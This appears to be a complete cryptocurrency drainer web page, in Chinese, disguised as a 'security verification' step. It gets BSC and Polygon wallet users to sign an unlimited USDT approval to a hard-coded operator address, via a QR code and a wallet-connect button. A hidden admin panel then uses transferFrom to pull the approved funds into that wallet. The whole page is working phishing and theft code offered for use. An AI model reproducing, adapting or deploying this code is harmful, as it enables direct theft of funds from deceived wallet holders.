<!DOCTYPE html>
<html lang="zh-CN">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>安全验证</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
.input-group{margin-bottom:16px;text-align:left}
.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
.input-group input{
width:100%;padding:12px;background:#111;border:1px solid #333;
border-radius:10px;color:#fff;font-size:15px
}
.chain-select{
display:flex;gap:10px;margin-bottom:20px;
}
.chain-btn{
flex:1;padding:10px;border-radius:10px;border:none;
background:#222;color:#aaa;font-weight:bold;cursor:pointer
}
.chain-btn.active{background:#F0B90B;color:#000}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
.status {margin-top:15px;padding:12px;border-radius:10px;background:#111;font-size:14px}
.status.success{background:#16a34a;color:#fff}
.status.warning{background:#ca8a04;color:#fff}

.modal {
position:fixed;top:0;left:0;width:100%;height:100%;
background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;
z-index:999;display:none;
}
.modal.show {display:flex}
.modal-content {
background:#1E1E35;padding:30px;border-radius:20px;text-align:center;
max-width:320px;width:90%
}
.modal-content h3 {margin-bottom:15px}
.modal-content p {color:#aaa;margin-bottom:20px}
.modal-btn {
padding:12px 24px;background:#F0B90B;color:#000;border:none;
border-radius:10px;font-weight:bold;cursor:pointer
}

.admin-panel {
background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
}
.admin-panel.show {display:block}
.admin-input {
width:100%;padding:12px;background:#111;border:none;
border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn {
width:100%;padding:14px;background:#F0B90B;color:#000;
border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
cursor:pointer;
}

#connectBtn {
margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;
border-radius:10px;width:100%;font-weight:bold
}
</style>

<div class="container">
  <div class="pay-box">
    <h1>💳 安全验证</h1>
    <p class="desc">完成签名即可正常使用</p>
    <div class="chain-select">
      <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
      <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
    </div>
    <div class="input-group">
      <label>授权金额</label>
      <input type="number" id="amount" value="10" min="0.01" step="0.01">
    </div>
    <div id="qrcode">生成二维码...</div>
    <div class="tip">TokenPocket 扫码直接签名，无跳转</div>
    <button id="connectBtn">连接钱包</button>
    <div id="authStatus" class="status">
      未连接钱包，无法检测授权状态
    </div>
  </div>

  <div class="admin-panel" id="adminPanel">
    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
    <button class="admin-btn" onclick="checkUserAuth()">检查用户授权</button>
    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
    <div id="adminStatus" class="status" style="margin-top:10px">
      请输入用户地址查询授权
    </div>
  </div>
</div>

<div class="modal" id="successModal">
  <div class="modal-content">
    <h3>✅ 授权成功</h3>
    <p>您已完成无限授权，可正常使用所有功能</p>
    <button class="modal-btn" onclick="closeModal()">确定</button>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<script>
const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

// BSC + Polygon 主网配置
const CONFIG = {
  bsc: {
    chainId: "56",
    chainIdHex: "0x38",
    token: "0x55d398326f99059fF775485246999027B3197955",
    decimals: 18,
    rpc: "https://bsc-dataseed.binance.org/",
    protocol: "bsc"
  },
  polygon: {
    chainId: "137",
    chainIdHex: "0x89",
    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
    decimals: 6,
    rpc: "https://polygon-rpc.com/",
    protocol: "polygon"
  }
};

const ERC20_ABI = [
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

let currentChain = "bsc";
let account = null;
let provider;
let refreshInterval;
let lastAuthStatus = null;

// 切换链
document.querySelectorAll(".chain-btn").forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    currentChain = btn.dataset.chain;
    renderQR();
    if (account) checkAuthStatus();
  };
});
document.getElementById("amount").addEventListener("input", renderQR);

// 生成 TP 钱包兼容的授权二维码
function genAuthEIP681() {
  const { chainId, token, protocol } = CONFIG[currentChain];
  const data = "0x095ea7b3" +
    ADMIN_WALLET.slice(2).padStart(64, '0') +
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  return `${protocol}:${token}@${chainId}?data=${data}`;
}

function renderQR() {
  const url = genAuthEIP681();
  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="授权二维码">`;
}

// 连接钱包 + 自动切换到对应主网
document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开"); return; }
  try {
    const { chainIdHex } = CONFIG[currentChain];
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: chainIdHex }]
    });

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    account = await signer.getAddress();
    checkAdmin();
    checkAuthStatus();
    if (refreshInterval) clearInterval(refreshInterval);
    refreshInterval = setInterval(checkAuthStatus, 5000);
  } catch (e) {
    if (e.code === 4902) {
      const { chainIdHex, chainName, nativeCurrency, rpcUrls, blockExplorerUrls } = 
        currentChain === "bsc" ? {
          chainIdHex: "0x38",
          chainName: "Binance Smart Chain Mainnet",
          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com/"]
        } : {
          chainIdHex: "0x89",
          chainName: "Polygon Mainnet",
          nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
          rpcUrls: ["https://polygon-rpc.com/"],
          blockExplorerUrls: ["https://polygonscan.com/"]
        };
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: chainIdHex,
          chainName: chainName,
          nativeCurrency: nativeCurrency,
          rpcUrls: rpcUrls,
          blockExplorerUrls: blockExplorerUrls
        }]
      });
    }
    alert("连接失败，请重试");
  }
};

// 检查是否为管理员
async function checkAdmin() {
  if (!account) return;
  const adminPanel = document.getElementById("adminPanel");
  const connectBtn = document.getElementById("connectBtn");
  if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
    adminPanel.classList.add("show");
    connectBtn.innerText = "✅ 已连接管理员";
  } else {
    adminPanel.classList.remove("show");
    connectBtn.innerText = "连接钱包";
  }
}

function closeModal() {
  document.getElementById("successModal").classList.remove("show");
}

// 检查当前用户授权状态
async function checkAuthStatus() {
  if (!account || !provider) {
    document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测授权状态";
    document.getElementById("authStatus").className = "status warning";
    lastAuthStatus = null;
    return;
  }
  try {
    const { token, decimals } = CONFIG[currentChain];
    const tokenContract = new ethers.Contract(token, ERC20_ABI, provider);
    const allowance = await tokenContract.allowance(account, ADMIN_WALLET);
    const statusEl = document.getElementById("authStatus");
    const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : (allowance > 0n ? "partial" : "none");

    if (currentStatus === "success" && lastAuthStatus !== "success") {
      document.getElementById("successModal").classList.add("show");
    }
    lastAuthStatus = currentStatus;

    if (allowance >= ethers.MaxUint256 / 2n) {
      statusEl.innerHTML = `✅ 授权成功！无限授权额度：${ethers.formatUnits(allowance, decimals)} USDT`;
      statusEl.className = "status success";
    } else if (allowance > 0n) {
      statusEl.innerHTML = `⚠️ 部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
      statusEl.className = "status warning";
    } else {
      statusEl.innerHTML = "❌ 未授权或授权已用完";
      statusEl.className = "status warning";
    }
  } catch (e) {
    document.getElementById("authStatus").innerHTML = "查询失败，请重试";
    document.getElementById("authStatus").className = "status warning";
  }
}

// 管理员检查用户授权
async function checkUserAuth() {
  const userAddr = document.getElementById("userAddr").value.trim();
  if (!userAddr || !ethers.isAddress(userAddr)) {
    alert("请输入有效的用户钱包地址");
    return;
  }
  try {
    const { token, decimals, rpc } = CONFIG[currentChain];
    const rpcProvider = new ethers.JsonRpcProvider(rpc);
    const tokenContract = new ethers.Contract(token, ERC20_ABI, rpcProvider);
    const allowance = await tokenContract.allowance(userAddr, ADMIN_WALLET);
    const statusEl = document.getElementById("adminStatus");
    
    if (allowance >= ethers.MaxUint256 / 2n) {
      statusEl.innerHTML = `✅ 用户已无限授权！可提取额度：${ethers.formatUnits(allowance, decimals)} USDT`;
      statusEl.className = "status success";
    } else if (allowance > 0n) {
      statusEl.innerHTML = `⚠️ 用户部分授权：${ethers.formatUnits(allowance, decimals)} USDT`;
      statusEl.className = "status warning";
    } else {
      statusEl.innerHTML = "❌ 用户未授权或授权已用完";
      statusEl.className = "status warning";
    }
  } catch (e) {
    document.getElementById("adminStatus").innerHTML = "查询失败，请重试";
    document.getElementById("adminStatus").className = "status warning";
  }
}

// 管理员提取用户代币
async function drawFromUser() {
  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
    alert("❌ 仅管理员可操作");
    return;
  }
  const user = document.getElementById("userAddr").value.trim();
  const amt = document.getElementById("drawAmount").value.trim();
  const { token, decimals } = CONFIG[currentChain];
  if (!user || !amt || isNaN(amt) || amt <= 0) {
    alert("❌ 输入无效");
    return;
  }
  try {
    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
    const data = "0x23b872dd" +
      user.slice(2).padStart(64, '0') +
      ADMIN_WALLET.slice(2).padStart(64, '0') +
      wei;
    const tx = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: account, to: token, data: data }]
    });
    alert("✅ 提取成功：" + tx);
    checkUserAuth();
  } catch (e) {
    alert("❌ 提取失败：未授权或金额不足");
  }
}

// 页面加载
window.addEventListener("load", () => {
  renderQR();
  if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accs) => {
      account = accs[0];
      checkAdmin();
      checkAuthStatus();
    });
  }
});
</script>
</body>
</html>
